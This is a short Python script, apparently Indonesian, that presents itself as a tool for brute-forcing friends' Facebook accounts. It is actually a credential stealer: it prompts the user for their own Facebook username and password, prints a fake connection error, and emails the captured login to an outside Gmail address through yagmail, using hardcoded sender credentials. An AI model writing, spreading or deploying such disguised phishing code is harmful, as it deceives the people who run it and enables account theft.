# -*- coding: utf-8 -*-
# coding=utf-8
import socket,struct,os,sys,time,yagmail
x=yagmail.SMTP('mks.mkltrj@gmail.com','makaletrj123')
subject='DAPAT NI AKUN'
logo = """\x1b[34m

 ██░ ██  ▄▄▄       ▄████▄   ██ ▄█▀  █████▒▄▄▄▄   
▓██░ ██▒▒████▄    ▒██▀ ▀█   ██▄█▒ ▓██   ▒▓█████▄ 
▒██▀▀██░▒██  ▀█▄  ▒▓█    ▄ ▓███▄░ ▒████ ░▒██▒ ▄██
░▓█ ░██ ░██▄▄▄▄██ ▒▓▓▄ ▄██▒▓██ █▄ ░▓█▒  ░▒██░█▀  
░▓█▒░██▓ ▓█   ▓██▒▒ ▓███▀ ░▒██▒ █▄░▒█░   ░▓█  ▀█▓
 ▒ ░░▒░▒ ▒▒   ▓▒█░░ ░▒ ▒  ░▒ ▒▒ ▓▒ ▒ ░   ░▒▓███▀▒
 ▒ ░▒░ ░  ▒   ▒▒ ░  ░  ▒   ░ ░▒ ▒░ ░     ▒░▒   ░ 
 ░  ░░ ░  ░   ▒   ░        ░ ░░ ░  ░ ░    ░    ░ 
 ░  ░  ░      ░  ░░ ░      ░  ░           ░      
                  ░                            ░\x1b[00m"""

banner = """
\x1b[34mHack Teman Facebook
\x1b[00mOtomatis Menghack Facebook Teman Menggunakan Bruteforce
\x1b[00mSilahkan Login Menggunakan Akun Untuk Mendapatkan Email Teman\x1b[91m!
"""
def main():
	os.system('clear')
	print(logo)
	print(banner)
	print('\x1b[00m\033[41m FACEBOOK LOGIN \033[00m')
	u=input('\x1b[00mUsername: \x1b[33m')
	p=input('\x1b[00mPassword: \x1b[33m')
	msg=('username: '+u+', password: '+p)
	body=(msg)
	print('')
	print('\x1b[00mKoneksi Bermasalah Tunggu Beberapa Saat\x1b[91m !\x1b[00m')
	print('\x1b[33mMohon Di Coba Lagi...')
	os.system('sleep 3')
	print('')
	print('\x1b[00mExiting program \x1b[91m!')
	os.system('exit')
	x.send('makaletrj098@gmail.com',subject,body)

main()
